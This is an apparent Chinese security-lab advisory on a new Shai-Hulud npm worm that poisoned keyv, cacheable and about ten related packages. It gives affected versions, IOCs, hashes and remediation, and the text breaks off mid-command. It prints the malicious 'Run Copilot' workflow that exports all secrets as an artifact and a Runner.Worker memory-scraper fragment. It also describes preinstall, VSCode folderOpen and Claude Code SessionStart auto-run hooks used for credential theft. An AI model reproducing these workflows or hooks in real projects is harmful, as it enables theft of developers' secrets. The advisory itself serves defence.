---
title: NPM 蠕虫式投毒Shai-Hulud再次来袭，keyv 与 cacheable多个周下载量数亿次组件受影响
url: https://mp.weixin.qq.com/s/34uap2Ly3565ia3gAtqKpQ
source: Doonsec's feed
date: 2026-08-05
fetch_date: 2026-08-06T04:59:18.060129
---

# NPM 蠕虫式投毒Shai-Hulud再次来袭，keyv 与 cacheable多个周下载量数亿次组件受影响

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/RibBgJR6rjzdWsmyl5VPx9UScGfWDcmrYotLM6L5rVBcTusrSzaO5168fNqyUtGbgnh95JN79rbwSdy15g53CfMW1SFbwsXhJDvZiaw257zh8/0?wx_fmt=jpeg)

# NPM 蠕虫式投毒Shai-Hulud再次来袭，keyv 与 cacheable多个周下载量数亿次组件受影响

墨菲安全实验室

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

![](https://mmbiz.qpic.cn/mmbiz_gif/RibBgJR6rjzdO751XRYM1qoao2a9lZJ5E2GAPpicicaV4ehaHQOowiaoRMuxGuo102esAJTyvmibU1RuWTLTkO53FgZ6CvpibPphtuwPeOd6QejSM/640?wx_fmt=gif&from=appmsg)

**事件简述**

**2026年8月4日17点38分**，墨菲安全实验室检测到 jaredwray/keyv 与 jaredwray/cacheable 下多个 npm 组件出现一轮带有明显自动化特征的恶意发布行为。**这是新一轮的Shai-hulud蠕虫攻击，影响NPM包超过400个**。

一旦开发者或 CI 环境安装了受影响版本，preinstall 钩子便会解密三层加密载荷，外联 C2 域名 npm-cache.com，扫描本地 40 余类凭据路径，涵盖 AWS、GCP、Azure、Kubernetes、GitHub Token、npm Token、SSH 私钥、加密货币钱包等，并通过 HTTPS 将窃取的数据外传。

**更具欺骗性的是，载荷中内嵌了一套令牌熔断机制：**攻击者窃取 GitHub Token 后不会立即使用，而是在受害主机上植入持久化监控脚本，每 60 秒轮询一次 GitHub API。Token 有效时静默潜伏，一旦被吊销便立即执行攻击者预置的任意命令。

**这意味着标准的「发现凭据泄露→立即轮换」应急响应流程反而会引爆载荷**。此外，载荷还包含一个专门针对 GitHub Actions Runner.Worker 进程的内存抓取器，直接读取 /proc/<pid>/mem 提取密钥，日志脱敏和作业内环境变量隔离对此完全无效。

**一、投毒时间线**

**多个影响较大的投毒包发布时间高度集中**，均在 2026 年 8 月 4 日 09:35 至 10:14（UTC）之间，40 分钟内完成了全部投放：

keyv@6.0.0 发布于 2026-08-04 09:35:00（UTC）

flat-cache@6.1.24 发布于 2026-08-04 10:10:55（UTC）

file-entry-cache@11.1.6 发布于 2026-08-04 10:13:02（UTC）

cacheable-request@13.0.20 发布于 2026-08-04 10:11:24（UTC）

cache-manager@7.2.10 发布于 2026-08-04 10:14:41（UTC）

**二、受影响包**

|  |  |  |  |  |
| --- | --- | --- | --- | --- |
| **发布时间(UTC)** | **包名** | **投毒版本** | **上一正常版本** | **当前latest** |
| 09:35 | keyv | 6.0.0 | 5.6.0 | 5.6.0（已回滚） |
| 10:09 | @cacheable/net | 2.1.1 | 2.1.0 | 2.1.0（已回滚） |
| 10:10 | @cacheable/node-cache | 3.1.2 | 3.1.1 | 3.1.1（已回滚） |
| 10:10 | cacheable | 2.5.1 | 2.5.0 | 2.5.0（已回滚） |
| 10:10 | flat-cache | 6.1.24 | 6.1.23 | 6.1.23（已回滚） |
| 10:11 | cacheable-request | 13.0.20 | 13.0.19 | 13.0.19（已回滚） |
| 10:11 | @cacheable/memory | 2.2.1 | 2.2.0 | 2.2.0（已回滚） |
| 10:13 | file-entry-cache | 11.1.6 | 11.1.5 | 11.1.5（已回滚） |
| 10:14 | @cacheable/utils | 2.5.1 | 2.5.0 | 2.5.0（已回滚） |
| 10:15 | cache-manager | 7.2.10 | 7.2.9 | 7.2.9（已回滚） |

截至本文撰写时，全部 10 个投毒版本已从 npm registry 删除，各包 latest 标签均已回滚至上一干净版本。

flat-cache 和 file-entry-cache 是 ESLint 的缓存层，几乎所有 JavaScript/TypeScript 项目都会间接依赖它们；cacheable-request 位于 got（最流行的 HTTP 请求库之一）的依赖链下；cache-manager 则是 Node.js 生态中最流行的缓存抽象层之一。

**这些包的主要安装对象是 CI/CD Runner，而载荷中恰好包含针对 CI环境的检测逻辑与组件，证实了攻击者的定向意图。**

**三、恶意代码分析**

```
sha256(setup.mjs)       = 54dc7ea54a1317cca0e890a2770630cf7fa6c97813e0cb9d2caa93012b350668sha256(Math_Symbol.js)  = 9fc2570b7cef51c1b8df116d144d11ff4096357be7d2c4c6367cfc2509cf1b
```

同一份 payload 文件被复制到了两个仓库，每个包的 package.json 均新增了 "preinstall": "node setup.mjs" 脚本和 ["setup.mjs", "Math\_Symbol.js"] 文件列表，而正常版本中均不存在这些字段。

除了 npm preinstall 钩子，攻击者还植入了两条 IDE 自动执行通道：

**VSCode：**.vscode/tasks.json 设置 runOn: "folderOpen"，clone 仓库后用 VSCode 打开即触发

**Claude Code：**.claude/settings.json 设置 SessionStart 钩子，clone 仓库后用 Claude Code 打开即触发

**两个配置文件还采用了交叉引用的迷惑设计**：打开 .claude/settings.json 查找 .claude/setup.mjs，找到的却是指向 .vscode/ 的引用，反之亦然。

开发者只需在 IDE 中打开仓库文件夹，无需执行任何安装命令即可触发攻击。

**1**

**三层加密载荷**

攻击链分为三层。

**第一层 setup.mjs（29,918 字节）是混淆型 Dropper**，检测系统是否已安装 Bun 运行时，若未安装则从 GitHub 官方 releases 下载 Bun，用 Bun 执行 Math\_Symbol.js，执行完毕后自行删除。

第一层中没有攻击者控制的域名，唯一外联目标是 github.com。

**第二层 Math\_Symbol.js（727,680 字节）是用 Bun 编译器打包的加密载荷容器**。

**经过三层加密保护：**PBKDF2 密钥派生（200,000 轮）+ AES-256-GCM 对称加密 + basE91 编码。

**载荷中还藏有一个反静态分析陷阱**：解密用的字符串表被约 72 个不同的解码器共享，先访问某个索引的解码器会「毒化」其他解码器的结果，产生虚假的「未找到 C2」否定结论。

**静态解密出的多个密封子载荷包括**：bash 引导脚本、.claude/settings.json、.vscode/tasks.json、混淆版 setup.mjs、Python 变体引导器、令牌熔断机制安装器、CI Runner.Worker /proc/<pid>/mem 密钥抓取器、恶意 workflow "Run Copilot"（toJSON(secrets) → upload-artifact），以及两个 RSA-4096 公钥。

**2**

**令牌熔断机制**

攻击者窃取 GitHub Token 后不会立即使用。

他在受害主机上植入监控脚本，写入 ~/.config/gh-token-monitor/（权限 600），并注册为 macOS LaunchAgent（com.user.gh-token-monitor，RunAtLoad + KeepAlive）或 Linux systemd 用户服务（配合 loginctl enable-linger 以在用户登出后仍保持存活）。

脚本每 60 秒用窃取的 Token 调用一次 api.github.com/user。**Token 有效时静默潜伏，一旦被吊销便立即执行攻击者预置的 handler**。

轮换凭据本身会引爆载荷。该脚本设有 24 小时 TTL，到期后自动退出并清理，因此当前不存在该文件不代表主机从未被命中。**监控脚本本体解密后源码：**

![](https://mmbiz.qpic.cn/mmbiz_png/RibBgJR6rjzeXUFbmXvp9sckibJDrveCZWxVJYyt6jGLNxNnKgHYvClGFsg9gCxjGqMuOibU1fiaTy60MmTZvbIetmXCTNNNw9hsv8nChjph7zo/640?wx_fmt=png&from=appmsg)

**3**

**CI Runner 内存抓取器**

```
def get_pid():    pids = [pid for pid in os.listdir('/proc') if pid.isdigit()]for pid in pids:with open(os.path.join('/proc', pid, 'cmdline'), 'rb') as f:if b'Runner.Worker' in f.read():return pid# 直接读取 /proc/<pid>/mem 中所有可读区域
```

**日志脱敏和作业内的环境变量隔离对此完全无效**，因为 secret 存在于 Runner.Worker 进程的内存中，无论作业步骤是否被授予访问权限。

**4**

**恶意 workflow "Run Copilot"**

```
name: Run Copiloton:  push:jobs:  format:    runs-on: ubuntu-latest    env:      VARIABLE_STORE: ${{ toJSON(secrets) }}    steps:      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd      - name: Copilot Setup        run: echo "$VARIABLE_STORE" > format-results.txt      - uses: actions/upload-artifact@bbbca2ddaa5d8feaa63e36b76fdaad77386f024f        with:          name: format-results          path: format-results.txt
```

攻击者使用了无害的名称和固定的 action SHA，通过普通构建产物的形式实现数据外传。

需要排查所有可达仓库中名为 "Run Copilot" 或引用 toJSON(secrets) 的 workflow。

**四、动态分析**

**payload 执行后依次完成了以下操作：**

![](https://mmbiz.qpic.cn/mmbiz_png/RibBgJR6rjzfKxoNPYrYFtNLlDvJmciaQBVWMSO0noe7ZjrlUeueRpc1vlicxib3micSLrwFvRWMs35OicoufrPyzmkYVNibBQt6KgXjBibz5cKB7ss/640?wx_fmt=png&from=appmsg)

**1**

**已确认的网络层IOC**

|  |  |  |
| --- | --- | --- |
| **IOC** | **类型** | **证据** |
| npm-cache.com | C2 外传域名 | stdout: "Sending to https://npm-cache.com" + "delivered batch of" |
| eth.llamarpc.com | 区块链 RPC | DNS 查询 + HTTPS 连接，连接失败 |
| go.getblock.io | 区块链 RPC | DNS 查询 + HTTPS 连接，连接失败 |
| eth-mainnet.nodereal.io | 区块链 RPC | DNS 查询 + HTTPS 连接 |

数据外传终点为 npm-cache.com（隐藏在 Cloudflare 背后），从实现上其存在多条路径，恶意代码优先选择通道A、A 不可用时再走通道B（即域名 C2 优先，GitHub作为备用路径）。

**通道A：**

最终POST https://npm-cache.com:443/router，JSON body = envelope（+ uuid）

加密 envelope：AES-256-GCM 正文 + RSA-OAEP 包密钥。

**通道B：**

写成仓库文件 results/results-<时间戳>-<序号>.json（可拆分 parts），再提交GitHub commit到token有权限的公开随机仓库，description是Shai-Hulud: Here We Go Again。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/RibBgJR6rjzfEhVPNhiakDNrS63mN1m1YZGBeOwljdOYv6atpqeic5pRawfoYTRvc8KZmFicVxjjZCurRv5ELxiabH9J5VialK7nic58v6Sj62I0gA/640?wx_fmt=png&from=appmsg)

**2**

**凭据扫描范围**

payload 实际扫描了**以下类型的凭据路径：**

**云平台：**AWS、Azure、GCP、阿里云、腾讯云、Hetzner；

**容器：**Kubernetes serviceaccount token、.kube、.docker

**CI/CD：**Jenkins、CircleCI、ArgoCD；

**AI 工具：**Claude Code 凭据、Cursor 凭据、MCP 配置；

**加密货币钱包：**Bitcoin、Electrum、Ethereum、Monero、Solana、Exodus、Ledger；

**通信工具：**Telegram、Discord、Signal、Element；

**通用：**SSH 私钥、npm token、git 凭据、Terraform 凭据；

**从而收集****如下敏感信息**：

**GitHub：**ghp\_ / gho\_ / ghs\_\*、ghtoken、ghs\_old、ghs\_jwt、gh auth token

**npm：**npm\_…、.npmrc、registry token

**AWS：**AKIA…、access/secret/session key、.aws/credentials、IMDS/ECS 角色凭证、Secrets Manager / SSM 值

**Azure / GCP：**Azure token 文件、GCP ADC / service account JSON（含 private\_key）

**K8s / Vault：**SA token、kubeconfig、Vault token/addr、集群 secret

**SSH / 密钥：**~/.ssh/id\_\*、authorized\_keys、各类 PRIVATE KEY

**数据库：**mongodb/mysql/postgres/redis://user:pass@…

**支付等：**(sk|pk)\_(test|live)\_…（Stripe 形态）

**Slack 等：**slack token 等

**通用配置：**password/secret/token/api\_key=… 键值对

**3**

**加密材料指纹**

```
pbkdf2 password : 2ddb1f3a749324a638484f53ad7da633d239cc9e7329cf0920a3d177ba48fc06pbkdf2 salt     : svksjrhjkcejg              (200000 iters, 32 bytes, sha256)derived master  : 899d419bf1e9ecc25bd436832aff03b6b9f73af20b053cbb9ff27e43512378b3RSA-4096 pubkey #1  sha256(DER) : dc1e6a7ddb29390dd53cf1e5aac40ad9204ea7c6b83ef5656e7cb7a796808b67RSA-4096 pubkey #2  sha256(DER) : 166be2b7b58a440f7b17520ffb0368be5d89c76661704b4945417eb04b9ada65persistence     : com.user.gh-token-monitor / gh-token-monitor.service
```

**五、处置建议**

**在清除令牌熔断机制之前，切勿轮换任何凭据。**轮换 GitHub Token 会触发熔断机制，执行攻击者预置的 handler。

**1**

**排查令牌熔断机制**

```
ls -la ~/.config/gh-token-monitor...